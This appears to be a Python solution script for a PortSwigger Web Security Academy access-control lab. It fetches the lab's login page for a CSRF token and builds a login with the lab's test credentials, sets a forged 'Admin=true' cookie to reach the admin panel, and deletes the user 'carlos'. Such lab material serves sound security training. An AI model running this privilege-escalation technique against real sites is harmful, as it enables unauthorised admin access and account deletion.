"""
https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter
"""

import sys
import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'https://{site}/login'
resp = s.get(login_url)

soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

logindata = {
    'csrf' : csrf,
    'username' : 'wiener',
    'password' : 'peter'
}

cookie_obj = requests.cookies.create_cookie(domain=site, name='Admin',value='true')
s.cookies.set_cookie(cookie_obj)

url = f'https://{site}/admin'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')

carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]

delete_uri = carlos_delete_link[0]['href']
s.get(f'https://{site}{delete_uri}')